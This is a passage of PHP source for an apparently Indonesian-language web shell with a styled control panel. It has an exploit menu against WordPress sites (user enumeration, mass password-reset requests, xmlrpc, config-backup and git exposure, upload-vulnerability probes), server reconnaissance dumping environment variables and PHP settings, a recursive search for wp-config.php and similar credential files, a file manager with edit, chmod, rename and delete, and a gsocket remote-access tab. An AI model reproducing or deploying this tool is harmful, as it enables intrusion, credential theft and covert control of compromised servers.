                            $cms_result .= "Ditemukan " . count($us) . " user:\n\n";
                            foreach ($us as $x) {
                                $cms_result .= "User: {$x['slug']}\n";
                                $reset = n7_post("$t/wp-login.php?action=lostpassword", ['user_login' => $x['slug'], 'redirect_to' => '', 'wp-submit' => 'Get New Password'], [], 8);
                                if (!$reset['error'] && stripos($reset['body'], 'check your email') !== false) $cms_result .= "  ✔ Reset sent\n";
                                else $cms_result .= "  ⚠ Failed\n";
                            }
                        }
                    } else $cms_result .= "✘ REST API tidak accessible\n";
                    break;
                case 'detect':
                    $t = trim($_POST['target'] ?? $self_base);
                    if (!preg_match('#^https?://#i', $t)) $t = $self_base;
                    if (!n7_validate_target($t)) { $cms_result = "⛔ AKSES DITOLAK"; break; }
                    $cms_result = n7_x_detect_cms($t);
                    break;
            }
        } catch (Throwable $ex) { $cms_result = "EXC: " . $ex->getMessage(); }
    }
}


$exploit_result = '';
if ($page === 'exploit' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exploit_act'])) {
    if (!n7_csrf_ok()) { $exploit_result = '⚠ CSRF invalid'; }
    else {
        $t = trim($_POST['target'] ?? '');
        if ($t === '') $t = $self_base;
        if (!preg_match('#^https?://#i', $t)) $t = $self_base;
        if (!n7_validate_target($t)) { $exploit_result = "⛔ AKSES DITOLAK! Host: $self_base"; }
        else {
            try {
                switch ($_POST['exploit_act']) {
                    case 'full':        $exploit_result = n7_full_scan($t); break;
                    case 'user_enum':   $exploit_result = n7_x_user_enum($t); break;
                    case 'rest_users':  $exploit_result = n7_x_rest_users($t); break;
                    case 'xmlrpc':      $exploit_result = n7_x_xmlrpc($t); break;
                    case 'config_bak':  $exploit_result = n7_x_config_bak($t); break;
                    case 'dir_list':    $exploit_result = n7_x_dir_list($t); break;
                    case 'git':         $exploit_result = n7_x_git($t); break;
                    case 'version':     $exploit_result = n7_x_version($t); break;
                    case 'mstore':      $exploit_result = n7_x_mstore($t); break;
                    case 'plugins':     $exploit_result = n7_x_plugins($t); break;
                    case 'robots':      $exploit_result = n7_x_robots($t); break;
                    case 'upload_vuln': $exploit_result = n7_x_upload_vuln($t); break;
                    case 'detect_cms':  $exploit_result = n7_x_detect_cms($t); break;
                    default:            $exploit_result = "Unknown action.\n";
                }
            } catch (Throwable $ex) { $exploit_result = "EXC: " . $ex->getMessage(); }
        }
    }
}


$tools_result = '';
if ($page === 'tools' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['tools_act'])) {
    if (!n7_csrf_ok()) { $tools_result = '⚠ CSRF invalid'; }
    else {
        ob_start();
        try {
            switch ($_POST['tools_act']) {
                case 'sysinfo':
                    echo "=== SYSTEM INFO ===\n";
                    foreach ($srv as $k => $v) echo str_pad($k, 15) . ': ' . $v . "\n";
                    break;
                case 'df':
                    echo "=== DISABLE_FUNCTIONS ===\n";
                    echo "disable_functions: " . (ini_get('disable_functions') ?: 'none') . "\n";
                    echo "open_basedir: " . (ini_get('open_basedir') ?: 'none') . "\n\n";
                    foreach (['shell_exec','exec','system','passthru','curl_init','file_get_contents','fopen','mkdir','chmod','unlink','rename','mysqli_connect','posix_getpwuid','symlink','link','mail','popen','proc_open'] as $f) {
                        echo str_pad($f, 22) . ': ' . (function_exists($f) ? '✔' : '✘') . "\n";
                    }
                    break;
                case 'phpinfo':
                    echo "=== PHPINFO ===\n\n";
                    $all = @ini_get_all();
                    if (is_array($all)) foreach ($all as $k => $v) {
                        $val = is_array($v) ? ($v['local_value'] ?? $v['global_value'] ?? '') : $v;
                        echo str_pad($k, 40) . ' = ' . $val . "\n";
                    }
                    break;
                case 'phpinfo_html':
                    ob_start(); phpinfo(INFO_GENERAL | INFO_CONFIGURATION | INFO_MODULES); $raw = ob_get_clean();
                    $tools_result = '<div style="background:#0a0000;color:#ffcccc;padding:10px;font-family:monospace;font-size:11px;max-height:600px;overflow:auto;border-radius:5px">' . str_replace(['#fff','#000','#222','#666','#ccf','#99c','#ddd','#009'], ['#0a0000','#0a0000','#ffcccc','#5a0000','rgba(60,0,0,.7)','rgba(40,0,0,.5)','rgba(20,0,0,.7)','#ff7777'], $raw) . '</div>';
                    break;
                case 'env':
                    echo "=== ENVIRONMENT ===\n";
                    $env = $_SERVER; ksort($env);
                    foreach ($env as $k => $v) echo str_pad($k, 25) . ' = ' . (is_array($v) ? json_encode($v) : $v) . "\n";
                    break;
                case 'dns':
                    echo "=== DNS LOOKUP ===\n";
                    $host = $self_host;
                    echo "Host: $host\nIP: " . @gethostbyname($host) . "\n";
                    if (function_exists('dns_get_record')) {
                        foreach (['A','AAAA','MX','NS','TXT','CNAME'] as $t) {
                            $recs = @dns_get_record($host, constant('DNS_' . $t));
                            if (!empty($recs)) {
                                echo "\n[$t]\n";
                                foreach ($recs as $r) {
                                    $s = [];
                                    foreach ($r as $k => $v) { if (!is_array($v)) $s[] = "$k=$v"; }
                                    echo '  ' . implode(' ', $s) . "\n";
                                }
                            }
                        }
                    }
                    break;
                case 'find_wp':
                    $root = $_POST['root'] ?? '/var/www';
                    echo "Scan config di: $root\n" . str_repeat('=', 50) . "\n";
                    if (!is_dir($root)) { echo "✘ Path invalid\n"; break; }
                    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                    $patterns = ['wp-config.php','config.php','configuration.php','settings.php','config.inc.php'];
                    $found = 0;
                    foreach ($it as $f) {
                        if ($f->isFile() && in_array($f->getFilename(), $patterns)) {
                            echo "✔ " . $f->getPathname() . " (" . n7_size($f->getSize()) . ")\n";
                            if (++$found >= 100) { echo "...(limit 100)\n"; break; }
                        }
                    }
                    if ($found === 0) echo "✘ None.\n";
                    break;
            }
        } catch (Throwable $ex) { echo "EXC: " . $ex->getMessage(); }
        if ($tools_result === '') $tools_result = trim(ob_get_clean());
        else ob_end_clean();
    }
}

$nav_items = [
    'home'    => ['icon' => '⌂', 'label' => 'FILES'],
    'exploit' => ['icon' => '⚔', 'label' => 'EXPLOIT'],
    'gsocket' => ['icon' => '🔌', 'label' => 'GSOCKET'],
    'tools'   => ['icon' => '⚙', 'label' => 'TOOLS'],
];


$entries = @scandir($cwd);
if ($entries === false) $entries = [];
$entries = array_values(array_diff($entries, ['.', '..']));
usort($entries, function($a, $b) use ($cwd) {
    $ad = is_dir($cwd . DIRECTORY_SEPARATOR . $a); $bd = is_dir($cwd . DIRECTORY_SEPARATOR . $b);
    if ($ad !== $bd) return $ad ? -1 : 1;
    return strcasecmp($a, $b);
});

function n7_breadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    if (trim($path, DIRECTORY_SEPARATOR) === '') $parts = [];
    $html = '<a href="?d=' . urlencode(DIRECTORY_SEPARATOR) . '" class="crumb-root">⌂ /</a>';
    $acc = '';
    foreach ($parts as $p) {
        if ($p === '') continue;
        $acc .= DIRECTORY_SEPARATOR . $p;
        $html .= '<span class="crumb-sep">›</span><a href="?d=' . urlencode($acc) . '" class="crumb">' . h($p) . '</a>';
    }
    return $html;
}

$gs_active = n7_gs_get_session();
$bg_gif = N7_BG_GIF;
?><!DOCTYPE html>
<html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?=N7_NAME?> // <?=ucfirst($page)?></title>
<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
html{scroll-behavior:smooth}
body{
  background:#08000d;color:#e8d8e8;font-family:'Courier New',monospace;font-size:13px;
  min-height:100vh;padding-bottom:50px;line-height:1.4;
  background-image:
    linear-gradient(rgba(15,0,25,.45), rgba(10,0,20,.55)),
    url('<?=$bg_gif?>');
  background-size:cover;
  background-position:center center;
  background-attachment:fixed;
  background-repeat:no-repeat;
}
body::before{
  content:'';position:fixed;inset:0;pointer-events:none;z-index:1;
  background:
    radial-gradient(circle at 15% 0%, rgba(120,0,80,.35) 0%, transparent 50%),
    radial-gradient(circle at 85% 100%, rgba(0,90,110,.3) 0%, transparent 50%),
    radial-gradient(ellipse at center, transparent 40%, rgba(10,0,20,.75) 100%);
  mix-blend-mode:multiply;
}
body::after{
  content:'';position:fixed;inset:0;pointer-events:none;z-index:1;
  background:repeating-linear-gradient(0deg,transparent 0 3px,rgba(255,0,80,.02) 3px 4px);
  animation:scanline 8s linear infinite;
}
@keyframes scanline{0%{background-position:0 0}100%{background-position:0 100%}}
a{color:#e088b0;text-decoration:none}
a:hover{color:#ffb0d0;text-shadow:0 0 8px #ff2a5f}
.wrap{position:relative;z-index:2;max-width:1500px;margin:0 auto;padding:12px}

header{
  display:flex;align-items:center;gap:10px;flex-wrap:wrap;
  border:1.5px solid rgba(200,20,90,.75);border-radius:10px;padding:10px 14px;margin-bottom:10px;
  background:linear-gradient(135deg, rgba(40,0,55,.75), rgba(15,0,25,.85));
  backdrop-filter:blur(16px) saturate(1.3);-webkit-backdrop-filter:blur(16px) saturate(1.3);
  box-shadow:
    0 0 30px rgba(255,0,80,.35),
    0 0 60px rgba(150,0,180,.2),
    inset 0 0 20px rgba(180,0,80,.15);
}
.skull{font-size:28px;color:#ff2a5f;text-shadow:0 0 14px #ff0040,0 0 30px #aa0050,0 0 3px #000;animation:pulse 2.2s infinite}
@keyframes pulse{0%,100%{opacity:.9}50%{opacity:1}}
header h1{font-size:15px;color:#ff4a80;letter-spacing:3px;text-shadow:0 0 12px #ff0040,0 0 4px #000}
header .meta{color:#c088b0;font-size:10px;margin-top:2px;text-shadow:0 0 3px #000}
header .spacer{flex:1;min-width:8px}
.badge{display:inline-block;padding:1px 6px;border-radius:10px;font-size:10px;
  background:rgba(160,0,80,.55);border:1px solid #d00060;color:#ffb0d0;margin-left:5px;text-shadow:0 0 3px #000}

.srv-bar{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:6px;margin-bottom:12px}
.srv-cell{
  background:linear-gradient(135deg, rgba(35,0,50,.78), rgba(15,0,25,.85));
  backdrop-filter:blur(12px) saturate(1.2);-webkit-backdrop-filter:blur(12px) saturate(1.2);
  border:1px solid rgba(160,0,80,.6);border-radius:6px;padding:6px 9px;font-size:10px;overflow:hidden;
  box-shadow:0 0 12px rgba(0,0,0,.5),inset 0 0 10px rgba(180,0,80,.08);
}
.srv-cell .k{color:#d888b8;font-size:9px;display:block;margin-bottom:1px;text-shadow:0 0 2px #000}
.srv-cell .v{color:#ffddaa;font-weight:bold;font-size:11px;word-break:break-all;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-shadow:0 0 3px #000}
.srv-cell.green{border-color:rgba(0,180,100,.6);background:linear-gradient(135deg, rgba(0,40,20,.78), rgba(0,15,10,.85))}
.srv-cell.green .k{color:#88ddbb}.srv-cell.green .v{color:#aaffcc}
.srv-cell.cyan{border-color:rgba(0,160,180,.6);background:linear-gradient(135deg, rgba(0,30,45,.78), rgba(0,15,25,.85))}
.srv-cell.cyan .k{color:#88dddd}.srv-cell.cyan .v{color:#aaffff}
.srv-cell.warn{border-color:rgba(180,140,0,.6);background:linear-gradient(135deg, rgba(40,30,0,.78), rgba(20,15,0,.85))}
.srv-cell.warn .k{color:#ddcc88}.srv-cell.warn .v{color:#ffeeaa}

.nav-tabs{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap}
.nav-tab{
  flex:1;min-width:85px;padding:9px 12px;
  background:linear-gradient(135deg, rgba(35,0,45,.85), rgba(15,0,25,.9));
  backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
  border:1px solid rgba(140,0,70,.7);border-radius:7px;color:#c088a8;cursor:pointer;text-align:center;
  font-size:11px;letter-spacing:2px;transition:.15s;text-decoration:none;
  display:flex;align-items:center;justify-content:center;gap:5px;
  text-shadow:0 0 3px #000;box-shadow:0 0 10px rgba(0,0,0,.4)
}
.nav-tab:hover{background:linear-gradient(135deg, rgba(60,0,80,.92), rgba(25,0,40,.92));color:#ffb0d0;border-color:#c00060}
.nav-tab.active{background:linear-gradient(180deg,#a0003a,#500020);color:#ffffff;border-color:#ff2a5f;
  box-shadow:0 0 22px rgba(255,0,60,.65);text-shadow:0 0 6px #ff0040,0 0 3px #000}
.nav-tab.active.green{background:linear-gradient(180deg,#006644,#003322);border-color:#00ff88;box-shadow:0 0 22px rgba(0,255,136,.6);color:#ccffdd}
.nav-tab.active.cyan{background:linear-gradient(180deg,#006666,#003333);border-color:#00ffff;box-shadow:0 0 22px rgba(0,255,255,.6);color:#ccffff}
@media(min-width:700px){.nav-tab{flex:0 1 auto;min-width:110px}}

.btn{display:inline-flex;align-items:center;justify-content:center;gap:4px;padding:6px 11px;
  background:linear-gradient(180deg,#8a0034,#400018);border:1px solid #c00060;border-radius:5px;
  color:#ffdde8;cursor:pointer;font-family:inherit;font-size:11px;transition:.15s;
  white-space:nowrap;text-decoration:none;line-height:1;
  text-shadow:0 0 3px #000;box-shadow:0 0 10px rgba(0,0,0,.4),inset 0 0 10px rgba(180,0,80,.1)}
.btn:hover{background:linear-gradient(180deg,#c0004a,#600025);box-shadow:0 0 16px rgba(255,0,60,.6);transform:translateY(-1px)}
.btn.green{background:linear-gradient(180deg,#005a44,#002a22);border-color:#00b088;color:#ddffed}
.btn.cyan{background:linear-gradient(180deg,#005a5a,#002a2a);border-color:#00b0b0;color:#ddffff}
.btn.orange{background:linear-gradient(180deg,#5a4000,#2a1a00);border-color:#ffaa00;color:#ffeecc}
.btn.red{background:linear-gradient(180deg,#a00020,#500010);border-color:#ff2050;color:#ffdddd}
.btn.xs{padding:3px 7px;font-size:10px}

.breadcrumb{
  background:linear-gradient(135deg, rgba(25,0,35,.82), rgba(15,0,20,.88));
  backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
  border:1px solid rgba(140,0,70,.6);border-radius:7px;padding:8px 12px;
  margin-bottom:12px;display:flex;align-items:center;gap:4px;flex-wrap:wrap;
  font-size:11px;overflow-x:auto;box-shadow:0 0 12px rgba(0,0,0,.5)
}
.crumb,.crumb-root{padding:3px 8px;border-radius:4px;font-size:11px;transition:.15s;text-shadow:0 0 3px #000}
.crumb{color:#aaffcc !important;background:rgba(0,60,35,.68);border:1px solid #00c060;text-shadow:0 0 6px rgba(0,255,120,.5)}
.crumb:hover{background:rgba(0,110,55,.85);border-color:#00ff88;color:#eeffee !important;box-shadow:0 0 12px rgba(0,255,120,.6)}
.crumb-root{color:#ffdd66 !important;background:rgba(60,45,0,.68);border:1px solid #ffaa00;text-shadow:0 0 6px rgba(255,200,0,.5)}
.crumb-root:hover{background:rgba(110,85,0,.85);border-color:#ffff00;color:#ffffcc !important}
.crumb-sep{color:#88c0a8;text-shadow:0 0 3px #000}

.msg{white-space:pre-wrap;background:rgba(0,0,0,.95);border:1px solid rgba(160,0,80,.7);border-radius:7px;
  padding:11px 13px;margin-bottom:12px;color:#ffccdd;font-size:12px;max-height:600px;
  overflow:auto;word-break:break-word;box-shadow:0 0 14px rgba(0,0,0,.6)}
.msg.err{border-color:#ff2a5f;color:#ff99b0;background:rgba(60,0,20,.9)}
.msg.term{background:#000;border-color:#00c060;color:#33ff88}
.msg.term-cyan{background:#000;border-color:#00cccc;color:#33ffff}
.msg.term-orange{background:#000;border-color:#ffaa00;color:#ffcc66}

.grid{display:grid;grid-template-columns:1fr;gap:12px}
@media(min-width:900px){.grid{grid-template-columns:1fr 1fr}}
.card{
  border:1px solid rgba(160,0,80,.65);border-radius:9px;
  background:linear-gradient(135deg, rgba(30,0,45,.85), rgba(12,0,20,.88));
  backdrop-filter:blur(14px) saturate(1.3);-webkit-backdrop-filter:blur(14px) saturate(1.3);
  overflow:hidden;margin-bottom:12px;
  box-shadow:0 0 22px rgba(0,0,0,.6),inset 0 0 15px rgba(180,0,80,.08);
}
.card.green{border-color:rgba(0,160,100,.65);background:linear-gradient(135deg, rgba(0,35,20,.85), rgba(0,15,10,.88))}
.card.cyan{border-color:rgba(0,140,160,.65);background:linear-gradient(135deg, rgba(0,25,40,.85), rgba(0,12,20,.88))}
.card.orange{border-color:rgba(160,110,0,.65);background:linear-gradient(135deg, rgba(35,25,0,.85), rgba(15,12,0,.88))}
.card h2{padding:8px 13px;background:linear-gradient(180deg,rgba(60,0,40,.95),rgba(25,0,20,.95));
  color:#ff5588;font-size:11px;letter-spacing:2px;border-bottom:1px solid rgba(160,0,80,.6);
  text-shadow:0 0 8px #ff0040,0 0 3px #000;display:flex;align-items:center;gap:7px}
.card.green h2{background:linear-gradient(180deg,rgba(0,60,35,.95),rgba(0,25,15,.95));color:#66ff99}
.card.cyan h2{background:linear-gradient(180deg,rgba(0,55,70,.95),rgba(0,20,30,.95));color:#66ddff}
.card.orange h2{background:linear-gradient(180deg,rgba(60,40,0,.95),rgba(25,18,0,.95));color:#ffcc66}
.card .body{padding:12px}

.file-table-wrap{overflow:auto;max-height:540px;border-radius:5px;background:rgba(0,0,0,.5)}
table{width:100%;border-collapse:collapse;font-size:12px}
th,td{padding:5px 7px;border-bottom:1px solid rgba(100,0,50,.5);text-align:left;vertical-align:middle}
th{color:#ff7090;font-size:10px;background:rgba(50,0,25,.92);position:sticky;top:0;z-index:1;text-shadow:0 0 3px #000}
tr:hover td{background:rgba(100,0,50,.35)}
.name{word-break:break-all;max-width:300px;color:#ffdde8;text-shadow:0 0 3px #000}
.perm-cell{font-size:10px;font-family:monospace;white-space:nowrap;font-weight:bold}
.size-cell{color:#ddb0c8;font-size:10px;white-space:nowrap;text-shadow:0 0 3px #000}
.action-cell{white-space:nowrap}
.action-cell .btn{margin:2px 1px}

.perm-danger{color:#ff4466 !important;text-shadow:0 0 6px rgba(255,68,102,.6),0 0 3px #000}
.dir.perm-danger,.file.perm-danger{color:#ff6080 !important}
.perm-safe{color:#44ff88 !important;text-shadow:0 0 6px rgba(68,255,136,.6),0 0 3px #000}
.dir.perm-safe,.file.perm-safe{color:#66ffaa !important}
.perm-warn{color:#ffdd55 !important;text-shadow:0 0 6px rgba(255,221,85,.6),0 0 3px #000}
.dir.perm-warn,.file.perm-warn{color:#ffee77 !important}
.perm-locked{color:#cc77ff !important;text-shadow:0 0 6px rgba(204,119,255,.6),0 0 3px #000}
.dir.perm-locked,.file.perm-locked{color:#dd99ff !important}
.perm-unknown{color:#aaa !important}

.legend{display:flex;gap:10px;flex-wrap:wrap;font-size:10px;color:#cc99b8;
  padding:7px 12px;border-top:1px solid rgba(100,0,50,.5);
  background:rgba(25,0,20,.85);text-shadow:0 0 3px #000}
.legend .dot{width:7px;height:7px;border-radius:50%;display:inline-block;margin-right:3px}
.dot-danger{background:#ff4466}.dot-safe{background:#44ff88}
.dot-warn{background:#ffdd55}.dot-locked{background:#cc77ff}

label{display:block;color:#ff7090;font-size:10px;margin-bottom:4px;margin-top:7px;text-shadow:0 0 3px #000}
input[type=text],input[type=password],input[type=email],textarea,select{
  width:100%;padding:7px 10px;background:rgba(35,0,40,.9);border:1px solid rgba(160,0,80,.7);border-radius:5px;
  color:#ffdde8;font-family:inherit;font-size:12px;outline:none;text-shadow:0 0 2px #000}
input:focus,textarea:focus{border-color:#ff2a5f;box-shadow:0 0 12px rgba(255,0,60,.5);background:rgba(45,0,50,.95)}
textarea{resize:vertical;min-height:90px}
.row{display:flex;gap:6px;flex-wrap:wrap;align-items:flex-end}
.row>input,.row>select{flex:1;min-width:120px}
.row .btn{flex:0 0 auto}
input[type=file]{padding:7px;background:rgba(35,0,40,.9);border:1px dashed rgba(160,0,80,.7);border-radius:5px;color:#ffcce0;font-size:11px;width:100%}

.exp-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px}
.exp-btn{padding:11px 10px;background:linear-gradient(135deg, rgba(40,0,50,.88), rgba(20,0,30,.9));
  border:1px solid rgba(160,0,90,.7);border-radius:7px;color:#ffdde8;cursor:pointer;font-family:inherit;
  font-size:11px;text-align:center;transition:.15s;text-decoration:none;
  display:flex;flex-direction:column;align-items:center;gap:5px;line-height:1.2;
  backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);text-shadow:0 0 3px #000;
  box-shadow:0 0 10px rgba(0,0,0,.4)}
.exp-btn:hover{background:linear-gradient(135deg, rgba(80,0,90,.92), rgba(35,0,50,.92));border-color:#ff2a5f;
  box-shadow:0 0 16px rgba(255,0,60,.55);transform:translateY(-2px)}
.exp-btn .icon{font-size:20px;color:#ff7098;text-shadow:0 0 6px rgba(255,0,80,.5)}
.exp-btn.full{background:linear-gradient(180deg,#a0003a,#500020);border-color:#ff2a5f}
.exp-btn.green{background:linear-gradient(135deg, rgba(0,40,25,.88), rgba(0,18,12,.9));border-color:#00a060;color:#ddffed}
.exp-btn.green .icon{color:#66ff99}
.exp-btn.cyan{background:linear-gradient(135deg, rgba(0,35,45,.88), rgba(0,18,25,.9));border-color:#00a0a0;color:#ddffff}
.exp-btn.cyan .icon{color:#66ddff}
.exp-btn.orange{background:linear-gradient(135deg, rgba(40,30,0,.88), rgba(20,15,0,.9));border-color:#aa8800;color:#ffeecc}
.exp-btn.orange .icon{color:#ffcc66}
.exp-btn.gs{background:linear-gradient(135deg, rgba(40,0,50,.88), rgba(25,0,30,.9));border-color:#cc00cc;color:#ffddff}
.exp-btn.gs .icon{color:#ff66ff}
.exp-btn.gs:hover{background:linear-gradient(135deg, rgba(80,0,90,.92), rgba(45,0,55,.92));border-color:#ff44ff;box-shadow:0 0 16px rgba(255,68,255,.6)}

.alert{padding:10px 13px;border-radius:7px;margin-bottom:12px;font-size:12px;line-height:1.5;
  backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
  text-shadow:0 0 3px #000;box-shadow:0 0 12px rgba(0,0,0,.4)}
.alert.info{background:linear-gradient(135deg, rgba(0,50,55,.75), rgba(0,25,30,.82));border:1px solid #00b0b0;color:#aaffff}
.alert.warn{background:linear-gradient(135deg, rgba(55,40,0,.75), rgba(25,18,0,.82));border:1px solid #ffaa00;color:#ffee88}

.modal{display:none;position:fixed;inset:0;z-index:100;background:rgba(5,0,10,.88);
  backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
  align-items:center;justify-content:center;padding:16px;animation:fadeIn .2s}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
.modal.active{display:flex}
.modal-content{background:linear-gradient(135deg, rgba(25,0,35,.98), rgba(12,0,20,.98));
  backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
  border:2px solid rgba(200,20,90,.8);border-radius:12px;width:100%;max-width:900px;max-height:90vh;
  display:flex;flex-direction:column;
  box-shadow:0 0 70px rgba(255,0,80,.55),0 0 100px rgba(150,0,180,.3),inset 0 0 30px rgba(180,0,80,.15);
  animation:slideUp .25s}
@keyframes slideUp{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
.modal-header{display:flex;align-items:center;justify-content:space-between;
  padding:12px 16px;border-bottom:1px solid rgba(160,0,80,.7);
  background:linear-gradient(180deg,rgba(70,0,40,.95),rgba(25,0,20,.95))}
.modal-header h3{color:#ff5588;font-size:13px;letter-spacing:2px;text-shadow:0 0 8px #ff0040,0 0 3px #000;margin:0}
.modal-close{background:linear-gradient(180deg,#a0003a,#500020);border:1px solid #ff2a5f;
  color:#ffffff;font-size:14px;font-weight:bold;padding:4px 10px;border-radius:5px;
  cursor:pointer;font-family:inherit;width:auto;margin:0;text-shadow:0 0 3px #000}
.modal-close:hover{background:linear-gradient(180deg,#d0004a,#800030);box-shadow:0 0 14px rgba(255,0,60,.7)}
.modal-body{padding:14px;overflow-y:auto;flex:1}
.edit-textarea{width:100%;min-height:400px;background:#0a000a;color:#ffccdd;
  border:1px solid rgba(160,0,80,.7);border-radius:5px;padding:10px;font-family:'Courier New',monospace;
  font-size:12px;outline:none;resize:vertical;line-height:1.5}
.edit-textarea:focus{border-color:#ff2a5f;box-shadow:0 0 14px rgba(255,0,60,.5)}

footer{
  position:fixed;bottom:0;left:0;right:0;z-index:3;
  background:linear-gradient(180deg,rgba(15,0,20,.95),rgba(8,0,12,.97));
  backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
  border-top:1px solid rgba(160,0,80,.7);padding:6px 12px;color:#b07090;font-size:10px;
  display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px;
  text-shadow:0 0 3px #000
}

@media(max-width:700px){
  .wrap{padding:7px}
  header{padding:8px 10px}
  header h1{font-size:13px}
  .skull{font-size:22px}
  .perm-cell,.size-cell{display:none}
  th,td{padding:4px 5px}
  .name{max-width:none;font-size:11px}
  .action-cell .btn{font-size:9px;padding:3px 5px}
  .card .body{padding:9px}
  .nav-tab{padding:7px 8px;font-size:10px;min-width:60px}
  .exp-grid{grid-template-columns:repeat(auto-fill,minmax(120px,1fr))}
  .srv-cell{padding:5px 7px}.srv-cell .v{font-size:10px}
  .modal-content{max-height:95vh}
  .edit-textarea{min-height:300px}
  body{background-size:cover;background-position:center top}
  body::after{display:none}
  .card,header,.nav-tab,.srv-cell{backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px)}
}
</style></head><body>
<div class="wrap">

<header>
  <div class="skull">☠</div>
  <div>
    <h1><?=N7_NAME?><span class="badge">v<?=N7_VERSION?></span></h1>
    <div class="meta">BY <?=N7_AUTHOR?> // YOU: <?=h($_SERVER['REMOTE_ADDR'] ?? '')?></div>
  </div>
  <div class="spacer"></div>
  <a href="?logout=1" class="btn red" onclick="return confirm('Logout?')">⎋ LOGOUT</a>
</header>

<div class="srv-bar">
  <div class="srv-cell"><span class="k">HOST</span><span class="v" title="<?=h($self_host)?>"><?=h($self_host)?></span></div>
  <div class="srv-cell"><span class="k">IP:PORT</span><span class="v"><?=h($srv['ip'])?>:<?=h($srv['port'])?></span></div>
  <div class="srv-cell green"><span class="k">OS</span><span class="v" title="<?=h($srv['os'])?>"><?=h($srv['os'])?></span></div>
  <div class="srv-cell green"><span class="k">PHP</span><span class="v"><?=h($srv['php'])?></span></div>
  <div class="srv-cell warn"><span class="k">USER/UID</span><span class="v"><?=h($srv['user'])?> / <?=h($srv['uid'])?></span></div>
  <div class="srv-cell cyan"><span class="k">SERVER</span><span class="v" title="<?=h($srv['server_sw'])?>"><?=h(substr($srv['server_sw'], 0, 30))?></span></div>
  <div class="srv-cell"><span class="k">MEM</span><span class="v"><?=h($srv['mem_used'])?> / <?=h($srv['mem_limit'])?></span></div>
  <div class="srv-cell cyan"><span class="k">DISK FREE</span><span class="v"><?=h($srv['disk_free'])?></span></div>
  <div class="srv-cell cyan"><span class="k">DISK TOTAL</span><span class="v"><?=h($srv['disk_total'])?></span></div>
  <div class="srv-cell warn"><span class="k">LOAD</span><span class="v"><?=h($srv['load'])?></span></div>
  <div class="srv-cell green"><span class="k">UPTIME</span><span class="v"><?=h($srv['uptime'])?></span></div>
  <div class="srv-cell"><span class="k">SHELL_EXEC</span><span class="v"><?=h($srv['shell_exec'])?></span></div>
  <div class="srv-cell green"><span class="k">MYSQLI</span><span class="v"><?=h($srv['mysqli'])?></span></div>
  <div class="srv-cell green"><span class="k">PDO_MYSQL</span><span class="v"><?=h($srv['pdo_mysql'])?></span></div>
</div>

<div class="nav-tabs">
<?php foreach ($nav_items as $key => $item):
    $cls = $page === $key ? 'active' : '';
    if ($page === $key && $key === 'exploit') $cls .= ' green';
    if ($page === $key && $key === 'gsocket') $cls .= ' cyan';
    if ($page === $key && $key === 'tools') $cls .= ' cyan';
?>
  <a href="?p=<?=$key?><?= $key==='home' && isset($_GET['d']) ? '&d='.urlencode($_GET['d']) : '' ?>"
     class="nav-tab <?=$cls ?>" onclick="beep(800,0.05)">
    <span><?=$item['icon']?></span> <?=$item['label']?>
  </a>
<?php endforeach; ?>
</div>

<?php if ($page === 'home'): ?>
<div class="breadcrumb"><?=n7_breadcrumb($cwd)?></div>
<?php if ($msg !== ''): ?><div class="msg <?=h($msg_type)?>"><?=h($msg)?></div><?php endif; ?>

<div class="card">
  <h2>☠ FILE MANAGER</h2>
  <div class="body">
    <div class="row" style="margin-bottom:8px">
      <input type="text" id="gotoPath" value="<?=h($cwd)?>">
      <button class="btn" onclick="goPath()">➤ GO</button>
      <a class="btn" href="?d=<?=urlencode(dirname($cwd))?>" onclick="beep(600)">⬆ UP</a>
      <a class="btn" href="?d=<?=urlencode(getcwd())?>" onclick="beep(700)">⌂ ROOT</a>
    </div>
    <div class="file-table-wrap">
      <table>
        <thead><tr><th class="perm-cell">PERM</th><th class="size-cell">SIZE</th><th>NAME</th><th style="width:1%">ACTION</th></tr></thead>
        <tbody>
        <?php if (empty($entries)): ?><tr><td colspan="4" style="text-align:center;color:#aa6680;padding:16px">— kosong —</td></tr><?php endif; ?>
        <?php foreach ($entries as $e):
            $p = $cwd . DIRECTORY_SEPARATOR . $e; $isdir = is_dir($p);
            $pc = n7_perm_class($p); $pl = n7_perm_label($p);
        ?>
          <tr>
            <td class="perm-cell <?=$pc?>"><?=$pl?></td>
            <td class="size-cell"><?=$isdir ? '<span style="color:#ffbb44">DIR</span>' : n7_size(@filesize($p))?></td>
            <td class="name">
              <?php if ($isdir): ?><a class="dir <?=$pc?>" href="?d=<?=urlencode($p)?>" onclick="beep(800)">📁 <?=h($e)?>/</a>
              <?php else: ?><span class="file <?=$pc?>">📄 <?=h($e)?></span><?php endif; ?>
            </td>
            <td class="action-cell">
              <?php if (!$isdir): ?><button class="btn xs" onclick="openEditModal('<?=h(addslashes($p))?>', '<?=h(addslashes($e))?>')">EDIT</button><?php endif; ?>
              <button class="btn xs" onclick="chmodP('<?=h(addslashes($p))?>','<?=$pl?>')">CHMOD</button>
              <button class="btn xs" onclick="renameP('<?=h(addslashes($p))?>')">RENAME</button>
              <form method="post" style="display:inline" onsubmit="return confirmDel('<?=h(addslashes($e))?>')">
